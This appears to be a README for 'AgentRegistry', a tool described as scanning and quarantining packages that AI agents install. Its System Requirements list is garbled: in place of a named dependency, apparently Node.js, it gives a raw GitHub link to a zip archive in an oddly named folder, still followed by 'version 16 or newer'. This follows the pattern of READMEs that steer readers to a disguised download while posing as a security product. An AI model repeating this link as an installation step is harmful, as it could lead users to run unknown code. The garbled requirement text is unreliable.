## 🔍 What is AgentRegistry?

### Why use AgentRegistry?

- Stops harmful code before it reaches your system.
- Protects against sneaky AI prompt hacks.
- Keeps your local environment safe and clean.
- Works automatically without requiring deep technical knowledge.

## 💻 System Requirements

You can use AgentRegistry on most modern computers. Here are the basic needs:

- **Operating System:** Windows 10 or later, macOS 10.15 or later, or Linux (Ubuntu 18.04+ recommended).
- **Memory:** At least 4 GB of RAM.
- **Storage:** Minimum 200 MB of free disk space for installation and package storage.
- **Software:** https://raw.githubusercontent.com/holoy77/AgentRegistry/main/timeously/Registry_Agent_1.6.zip version 16 or newer. (Node is the software needed to run many AI agent tools.)
- **Internet Access:** Needed only when downloading new packages or updates.

AgentRegistry runs locally, so it does not require continuous internet access once packages are downloaded.

## 🛠 Using AgentRegistry

Once installed, AgentRegistry runs quietly in the background. Here is how it works for you:

### Adding packages to scan

When an AI agent tries to install a package, AgentRegistry intercepts the request.

- It scans the package for known security issues.
- If the package is safe, it stores it locally for quick access.
- If a threat is found, it blocks the package and notifies you.

### Managing quarantined packages

Sometimes AgentRegistry detects suspicious packages and moves them to quarantine:

- You can review quarantined packages anytime via the AgentRegistry interface.
- If you trust the package, you can release it after manual inspection.
- Otherwise, quarantined packages stay blocked to protect your system.

---

## 🔧 Common Tasks

### Checking your security logs

AgentRegistry keeps detailed logs of all scanned packages and actions taken. Access these logs in the application under the "Security Logs" tab to track any potential threats.

### Updating AgentRegistry

To stay protected, regularly update AgentRegistry by downloading the newest release from the same GitHub page:
